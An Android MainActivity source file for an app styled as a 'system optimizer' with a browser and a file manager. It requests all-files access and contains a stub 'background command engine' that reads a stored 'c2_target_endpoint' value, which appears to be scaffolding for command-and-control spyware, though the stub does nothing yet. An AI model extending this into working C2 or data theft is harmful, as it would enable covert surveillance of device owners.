package com.system.optimizer.utility;

import android.Manifest;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkCapabilities;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.View;
import android.webkit.MimeTypeMap;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.content.FileProvider;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private SharedPreferences c2Prefs;
    private static final String PREF_NAME = "SystemCoreConfig";
    private static final String KEY_C2_TARGET = "c2_target_endpoint";

    private WebView webView;
    private LinearLayout homeDashboard, fileManagerLayout;
    private FrameLayout mainContainer;
    private Button startBrowseBtn, startFilesBtn, btnHome, btnBrowse, btnFiles, btnGrantAllAccess;
    private Toolbar toolbar;
    private ListView fileListView;
    private TextView currentPathText;
    
    private static final int ALL_PERMISSIONS_CODE = 400;
    private File currentDirectory;
    private List<File> fileListList;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        c2Prefs = getSharedPreferences(PREF_NAME, MODE_PRIVATE);
        if (!c2Prefs.contains(KEY_C2_TARGET)) {
            c2Prefs.edit().putString(KEY_C2_TARGET, "").apply();
        }

        toolbar = findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        if (getSupportActionBar() != null) {
            getSupportActionBar().setTitle("");
        }

        mainContainer = findViewById(R.id.mainContainer);
        btnHome = findViewById(R.id.btnHome);
        btnBrowse = findViewById(R.id.btnBrowse);
        btnFiles = findViewById(R.id.btnFiles);

        webView = findViewById(R.id.webView);
        homeDashboard = findViewById(R.id.homeDashboard);
        fileManagerLayout = findViewById(R.id.fileManagerLayout);
        startBrowseBtn = findViewById(R.id.startBrowseBtn);
        startFilesBtn = findViewById(R.id.startFilesBtn);
        
        fileListView = findViewById(R.id.fileListView);
        currentPathText = findViewById(R.id.currentPathText);
        btnGrantAllAccess = findViewById(R.id.btnGrantAllAccess);

        mainContainer.animate().alpha(1.0f).setDuration(600).start();
        checkAndRequestStoragePermissions();

        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setLoadsImagesAutomatically(true);
        webSettings.setAllowFileAccess(true);
        webSettings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                view.loadUrl(url);
                return true;
            }
        });

        btnHome.setOnClickListener(v -> { setActiveTab(btnHome); showHome(); });
        btnBrowse.setOnClickListener(v -> { setActiveTab(btnBrowse); openBrowse("https://duckduckgo.com"); });
        btnFiles.setOnClickListener(v -> { setActiveTab(btnFiles); openFileManager(); });

        startBrowseBtn.setOnClickListener(v -> { setActiveTab(btnBrowse); openBrowse("https://duckduckgo.com"); });
        startFilesBtn.setOnClickListener(v -> { setActiveTab(btnFiles); openFileManager(); });

        btnGrantAllAccess.setOnClickListener(v -> requestManageAllFilesPermission());

        fileListList = new ArrayList<>();
        fileListView.setOnItemClickListener((parent, view, position, id) -> {
            if (position >= 0 && position < fileListList.size()) {
                File selectedFile = fileListList.get(position);
                if (selectedFile.isDirectory()) {
                    loadDirectory(selectedFile);
                } else {
                    showFileOptionsDialog(selectedFile);
                }
            }
        });

        setActiveTab(btnHome);
        initBackgroundCommandEngine();
    }

    private void showFileOptionsDialog(File file) {
        CharSequence[] options = {"👁️ View / Open File", "🗑️ Delete File", "❌ Cancel"};
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle(file.getName());
        builder.setItems(options, (dialog, which) -> {
            if (which == 0) {
                openFile(file);
            } else if (which == 1) {
                deleteFileItem(file);
            }
        });
        builder.show();
    }

    private void openFile(File file) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW);
            Uri uri;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                uri = FileProvider.getUriForFile(this, "com.system.optimizer.utility.fileprovider", file);
                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                intent.addFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
            } else {
                uri = Uri.fromFile(file);
            }

            String extension = MimeTypeMap.getFileExtensionFromUrl(Uri.fromFile(file).toString());
            String mimeType = MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension.toLowerCase());
            if (mimeType == null) {
                mimeType = "*/*";
            }

            intent.setDataAndType(uri, mimeType);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            
            Intent chooserIntent = Intent.createChooser(intent, "Open file with...");
            chooserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(chooserIntent);
        } catch (Exception e) {
            Toast.makeText(this, "Unable to open file: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }

    private void deleteFileItem(File file) {
        try {
            if (file.exists() && file.delete()) {
                Toast.makeText(this, "File deleted successfully", Toast.LENGTH_SHORT).show();
                loadDirectory(currentDirectory);
            } else {
                boolean deleted = file.delete();
                if (deleted) {
                    Toast.makeText(this, "File deleted successfully", Toast.LENGTH_SHORT).show();
                    loadDirectory(currentDirectory);
                } else {
                    Toast.makeText(this, "Unable to delete (Protected)", Toast.LENGTH_SHORT).show();
                }
            }
        } catch (Exception e) {
            Toast.makeText(this, "Failed to delete file", Toast.LENGTH_SHORT).show();
        }
    }

    private void checkAndRequestStoragePermissions() {
        List<String> permissionsList = new ArrayList<>();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissionsList.add(Manifest.permission.READ_MEDIA_IMAGES);
            permissionsList.add(Manifest.permission.READ_MEDIA_VIDEO);
            permissionsList.add(Manifest.permission.READ_MEDIA_AUDIO);
            permissionsList.add(Manifest.permission.POST_NOTIFICATIONS);
        } else {
            permissionsList.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            permissionsList.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }

        List<String> neededPermissions = new ArrayList<>();
        for (String perm : permissionsList) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                neededPermissions.add(perm);
            }
        }

        if (!neededPermissions.isEmpty()) {
            ActivityCompat.requestPermissions(this, neededPermissions.toArray(new String[0]), ALL_PERMISSIONS_CODE);
        }
    }

    private void requestManageAllFilesPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            } catch (Exception e) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                startActivity(intent);
            }
        } else {
            Toast.makeText(this, "Storage permissions active.", Toast.LENGTH_SHORT).show();
        }
    }

    private void openFileManager() {
        homeDashboard.setVisibility(View.GONE);
        webView.setVisibility(View.GONE);
        fileManagerLayout.setVisibility(View.VISIBLE);

        File rootDir = Environment.getExternalStorageDirectory();
        if (rootDir == null || !rootDir.exists()) {
            rootDir = new File("/storage/emulated/0");
        }
        loadDirectory(rootDir);
    }

    private void loadDirectory(File directory) {
        if (directory == null || !directory.exists()) {
            Toast.makeText(this, "Directory not accessible", Toast.LENGTH_SHORT).show();
            return;
        }

        currentDirectory = directory;
        currentPathText.setText("Path: " + currentDirectory.getAbsolutePath());

        fileListList.clear();
        ArrayList<String> displayNames = new ArrayList<>();
        File[] files = currentDirectory.listFiles();

        if (files != null) {
            for (File file : files) {
                fileListList.add(file);
                if (file.isDirectory()) {
                    displayNames.add("📁 " + file.getName());
                } else {
                    String name = file.getName().toLowerCase();
                    if (name.endsWith(".jpg") || name.endsWith(".png") || name.endsWith(".jpeg")) {
                        displayNames.add("🖼️ " + file.getName());
                    } else if (name.endsWith(".mp4") || name.endsWith(".mkv")) {
                        displayNames.add("🎬 " + file.getName());
                    } else {
                        displayNames.add("📄 " + file.getName());
                    }
                }
            }
        }

        ArrayAdapter<String> adapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, displayNames);
        fileListView.setAdapter(adapter);
    }

    private void setActiveTab(Button selectedButton) {
        btnHome.setTextColor(android.graphics.Color.parseColor("#808080"));
        btnBrowse.setTextColor(android.graphics.Color.parseColor("#808080"));
        btnFiles.setTextColor(android.graphics.Color.parseColor("#808080"));

        selectedButton.setTextColor(android.graphics.Color.parseColor("#FFFFFF"));
        selectedButton.animate().scaleX(1.08f).scaleY(1.08f).setDuration(100).withEndAction(() -> 
            selectedButton.animate().scaleX(1.0f).scaleY(1.0f).setDuration(100).start()
        ).start();
    }

    private void showHome() {
        homeDashboard.setVisibility(View.VISIBLE);
        webView.setVisibility(View.GONE);
        fileManagerLayout.setVisibility(View.GONE);
    }

    private void openBrowse(String url) {
        homeDashboard.setVisibility(View.GONE);
        fileManagerLayout.setVisibility(View.GONE);
        webView.setVisibility(View.VISIBLE);
        webView.loadUrl(url);
    }

    @Override
    public void onBackPressed() {
        if (fileManagerLayout.getVisibility() == View.VISIBLE && currentDirectory != null && currentDirectory.getParentFile() != null) {
            if (!currentDirectory.getAbsolutePath().equals(Environment.getExternalStorageDirectory().getAbsolutePath())) {
                loadDirectory(currentDirectory.getParentFile());
                return;
            }
        }
        if (webView.getVisibility() == View.VISIBLE && webView.canGoBack()) {
            webView.goBack();
        } else if (webView.getVisibility() == View.VISIBLE || fileManagerLayout.getVisibility() == View.VISIBLE) {
            showHome();
            setActiveTab(btnHome);
        } else {
            super.onBackPressed();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == ALL_PERMISSIONS_CODE) {
            Toast.makeText(this, "Storage Permissions Processed", Toast.LENGTH_SHORT).show();
        }
    }

    private void initBackgroundCommandEngine() {
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            String activeTarget = c2Prefs.getString(KEY_C2_TARGET, "");
        }, 6000);
    }
}
